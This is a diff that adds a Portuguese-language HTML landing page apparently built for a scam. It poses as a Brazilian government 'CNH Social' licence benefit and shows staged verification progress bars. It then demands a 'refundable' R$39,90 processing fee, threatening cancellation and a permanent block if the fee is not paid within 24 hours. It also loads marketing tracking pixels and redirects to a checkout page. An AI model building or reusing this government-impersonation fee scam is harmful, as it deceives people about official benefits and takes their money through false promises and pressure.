@@ -1,0 +1,177 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <script>
+  window.pixelId = "69004dfc4831eecd3cbc3843";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+
+      <script
+        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+        data-utmify-prevent-subids
+        data-utmify-ignore-iframe
+        async
+        defer
+      ></script>
+    <link rel="icon" href="images/favicon.png" type="./image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="images/favicon.png">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="css/base.css">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
+    <title>CNH Social - Programa Governamental</title>
+</head>
+
+<body>
+    <div id="content">
+        <style>
+            .navbar {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                background-color: #2865AE;
+                padding-bottom: 10px;
+                padding-left: 10px;
+            }
+        </style>
+        <nav class="navbar" style="padding-top: 15px;">
+            <div class="menu-icon" style="padding-left: 3%;">
+                <img src="images/logo-jadlog.png" style="height: 5vh;" alt="Logo CNH Social">
+            </div>
+
+            <div class="logo-central">
+            </div>
+
+            <div class="menu-icon" style="padding-right: 3%;">
+                <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: #ffffff">description</span>
+            </div>
+        </nav>
+
+
+        <div class="progress-container">
+            <div>
+                <div class="progress-item">
+                    <div class="progress-bar" id="bar1"></div>
+
+                    <div class="check-container" id="check1">
+                        <img src="images/success.png" alt="Animação" id="img1">
+                    </div>
+                </div>
+
+                <p id="text1">Verificando Documentos</p>
+            </div>
+
+            <div>
+                <div class="progress-item">
+                    <div class="progress-bar" id="bar2"></div>
+
+                    <div class="check-container" id="check2">
+                        <img src="images/success.png" alt="Animação" id="img2">
+                    </div>
+                </div>
+
+                <p id="text2">Validando Benefício</p>
+            </div>
+
+            <div>
+                <div class="progress-item">
+                    <div class="progress-bar" id="bar3"></div>
+
+                    <div class="check-container" id="check3">
+                        <img src="images/success.png" alt="Animação" id="img3">
+                    </div>
+                </div>
+
+                <p id="text3">Processando Inscrição</p>
+            </div>
+
+            <div>
+                <div class="progress-item">
+                    <div class="progress-bar" id="bar4"></div>
+
+                    <div class="check-container" id="check4">
+                        <img src="images/success.png" alt="Animação" id="img4">
+                    </div>
+                </div>
+
+                <p id="text4">Concluído</p>
+            </div>
+        </div>
+
+        <section id="more-information">
+            <h1>ATENÇÃO!</h1>
+
+            <h2>Validação Obrigatória</h2>
+
+            <p>
+                Durante a análise da sua inscrição no programa CNH Social, identificamos a necessidade de uma <span class="bold">taxa de processamento obrigatória</span>, exigida pelo sistema para validar sua elegibilidade ao benefício governamental.
+            </p>
+
+            <p>
+                Esta taxa é <span class="bold">totalmente reembolsável</span> e será devolvida automaticamente após a confirmação da sua aprovação no programa CNH Social.
+            </p>
+
+            <p>Clique no botão abaixo para calcular e quitar a taxa de processamento.</p>
+
+
+            <button id="show-offer" disabled="">CALCULAR TAXA</button>
+        </section>
+    </div>
+
+    <div id="offer-modal" class="modal">
+        <div class="modal-content">
+
+            <div id="step1">
+                <h1>Verificando Elegibilidade</h1>
+
+                <div id="trace" class="progress-bar2"></div>
+
+                <p>Por favor, aguarde enquanto validamos sua inscrição...</p>
+            </div>
+
+            <div id="step2">
+                <p>MOTIVO DA TAXA:</p>
+                <span id="reason" class="bold">VALIDAÇÃO CNH SOCIAL</span><br>
+
+                <p>Foi identificada uma <span class="bold2">taxa obrigatória de processamento</span> para validar sua elegibilidade ao programa CNH Social.
+                    Após o pagamento, o valor será <span class="bold2">totalmente reembolsado</span> quando sua CNH for emitida.</p>
+
+                <h1>REGULARIZE AGORA</h1>
+
+                <p>Efetue o pagamento da taxa</p>
+
+                <h1 id="value">R$39,90</h1>
+
+                <a onclick="checkout(event)">QUITAR TAXA</a>
+
+                <p>Atenção: Caso a taxa de <span class="bold3">R$39,90</span> não seja quitada em até 24 horas, sua inscrição será cancelada e você perderá o direito ao benefício CNH Social. O não cumprimento resultará no <span class="bold4">bloqueio permanente</span> da sua participação no programa.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function checkout(event) {
+          event.preventDefault(); 
+          var currentUrlParams = window.location.search;
+          var separator = currentUrlParams ? '&' : '?';
+          window.location.href = "/cnh/checkoutup/index.html" + currentUrlParams + separator + "from_upsell=1&valor=3990";
+        }
+      </script>
+
+    <script src="js/scripts.js"></script>
+
+
+
+
+</body></html>
